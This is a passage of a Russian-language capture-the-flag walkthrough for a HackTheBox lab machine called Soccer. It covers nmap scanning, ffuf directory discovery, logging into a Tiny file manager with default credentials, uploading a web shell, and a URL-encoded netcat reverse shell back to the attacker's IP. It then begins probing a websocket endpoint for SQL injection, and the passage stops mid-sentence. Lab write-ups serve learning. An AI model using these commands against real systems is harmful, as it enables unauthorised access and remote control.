Сканируем машину с помощью nmap:

```
sudo nmap -sC -sV 10.129.19.28
```

![Nmap scan](./screenshots/Pasted%20image%2020260614200841.png)

На 80 порту висит сайт, который надо предварительно добавить в /etc/hosts

![[Pasted image 20260614201006.png]]

![[Pasted image 20260614201015.png]]

На сайте особо нет функционала, поэтому сразу переходим к поиску директорий с помощью ffuf

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt http://soccer.htb/FUZZ
```

Находим что на сервере работает файловый менеджер `tiny`

![[Pasted image 20260614201246.png]]

У нас получается в нем авторизоваться с дефолтными кредами `admin:admin@123`

![[Pasted image 20260614201437.png]]

В нем мы можем добавлять файлы только в директорию uploads. В ней мы создаем папку `test` и добавляем в неё веб шелл:

![[Pasted image 20260614201736.png]]

С его помощью выполняем следующий реверс-шелл для более удобного взаимодействия:
 
```
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.15.222%209001%20%3E%2Ftmp%2Ff
```


![[Pasted image 20260614201833.png]]


После этого мы запускаем `LinPEAS` для поиска возможных путей повышения привилегий, и находим еще один виртуальный хост работающий на сервере

![[Pasted image 20260614201958.png]]

Также добавляем его в `/etc/hosts` и переходим на него:

![[Pasted image 20260614202121.png]]

Регистрируемся на нем, чтобы увидеть все его возможности. После изучаем сайт, и находим страницу проверки билета, это наша основная цель, так как напрямую связана с БД. Особенность в том, что оно работает через веб сокеты.

Проверки на SQL-инъекции с помощью добавления специальных символов не работают. Они не дают результата, но зато срабатывают логические выражения:
